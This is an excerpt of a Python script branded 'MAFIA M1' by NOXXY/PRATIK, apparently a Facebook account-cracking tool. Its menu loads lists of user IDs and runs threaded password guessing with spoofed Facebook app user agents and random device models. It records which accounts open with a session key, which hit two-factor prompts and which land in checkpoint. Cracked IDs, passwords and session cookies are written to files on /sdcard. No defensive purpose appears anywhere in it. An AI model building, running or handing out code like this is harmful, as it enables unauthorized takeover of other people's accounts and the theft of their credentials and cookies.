...
os.system('clear')
print('             \x1b[38;5;46m 𝐓𝐇'𝟑 𝐆𝐎𝐃 𝐎𝐅 𝐓𝐇𝐄 𝐖𝐎𝐑𝐋𝐃          ')
...
def UAA():
    ...
    model2 = random.choice(["SM-G986U","SM-G973F","SM-N960F","moto g play","M2103K19G","SM-T835","SM-A125F","CPH2385","Z6356T","SM-A217F","SM-G780G","SM-A032F","SM-G770F","vivo 1920","SM-F936B","SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E"])
...
os.system(f'xdg-open https://t.me/EZ_X4')
#os.system(f'xdg-open https://chat.whatsapp.com/LcGBrnPS2KC3b1p7GFJqa4')
sys.stdout.write('\x1b]2; MAFIA M1 > DECODE BY JOKER | @EZ_X4 \x07')
...
\033[1;34m═════════════════════════════════════════
 {white}[{red}–{white}] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 : 𝗣𝗥𝗔𝗧𝗜𝗞 𝗚𝗨𝗥𝗨𝗡𝗚
 {white}[{red}–{white}] 𝗚𝗜𝗧𝗛𝗨𝗕    : 𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘
 {white}[{red}–{white}] 𝗔𝗨𝗧𝗛𝗢𝗥   : 𝗣𝗥𝗔𝗧𝗜𝗞-𝗘𝗫𝗘
 {white}[{red}–{white}] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡   : 𝟲.𝟴
\033[1;34m═════════════════════════════════════════""")
𝐓𝐇'𝟑 𝐆𝐎𝐃 𝐎𝐅 𝐓𝐇𝐄 𝐖𝐎𝐑𝐋𝐃 
def linex():
    print('\033[1;34m═════════════════════════════════════════')
#------------------[ system clear ]-------------------#
def clear():
...
def menu():
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/noxxy.txt')
                                linex()
                                ...
                                linex()
                                print(' \033[1;32m[\033[1;31m1\033[1;32m] METHOD / \033[1;31mUPDTED ')
                                print(' \033[1;32m[\033[1;31m2\033[1;32m] METHOD / \033[1;31mUPDTED ')
                                print(' \033[1;32m[\033[1;31m3\033[1;32m] METHOD / \033[1;31mUPDTED ')
                                print(' \033[1;32m[\033[1;31m4\033[1;32m] METHOD / \033[1;31mUPDTED ')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UID  : \033[1;32m'+total_ids+f' ')
                                        print(' \033[1;32m[\033[1;31m–\033[1;32m] SIM NAME   : \033[1;32m'+carrier+f' ')
...
def M_file_1(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MAFIA-M1\033[1;37m]>×<[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/66.0.0.4452;FBPN/com.facebook.orca;FBLC/zh_CN;FBBV/276183812;FBCR/Almadar;FBMF/samsung;FBBD/samsung;FBDV/SM-J320FN|LMY47V;FBSV/9.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.5,width=1157,height=1590};FB_FW/1;FBRV/276183812]" 
...
def M_file_3(ids,names,passlist):
    try:
        global oks,cps,loop
        boos = random.choice([P,M,H,K,B,U,O,N])
        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MAFIA-M3\033[1;37m]>×<[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
...
'Content-Type': 'application/json'}
            ...
            if 'session_key' in po:
                ...
                #print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
                open('/sdcard/NOXXY_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NOXXY_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
                     print('\r\r\033[1;34m<[NOXXY-2F]> '+ids+' | '+pas)
                     open('/sdcard/MAFIA-2F.txt','a').write(ids+'|'+pas+'\n')
                     twf.append(ids)
                     break
            elif 'www.facebook.com' in po['error']['message']:
                  if 'y' in pcp:        
                    print('\r\x1b[38;5;246m<[NOXXY-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                    open('/sdcard/NOXXY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
...
def M_file_4(ids,names,passlist):
        try:
                global oks,loop
                boos = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f'\r\r\033[1;37m<[{boos}MAFIA-M4\033[1;37m]>×<[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\x1b[1;92m<[PRATIK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]
                                        open('/sdcard/NOXXY_n4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAFIA_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r\033[1;34m<[NOXXY-2F]> '+ids+' | '+pas)
                                                open('/sdcard/NOXXY-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\x1b[38;5;246m<[NOXXY-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    NOXXY=('M16x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    ...
    try: 
        if NOXXY in system:
            ...
            print('\033[1;34m═════════════════════════════════════════')
            print(logo)
            print(f"\033[1;32m[\033[1;31m–\033[1;32m] YOUR KEY : \033[31;1m{NOXXY}")
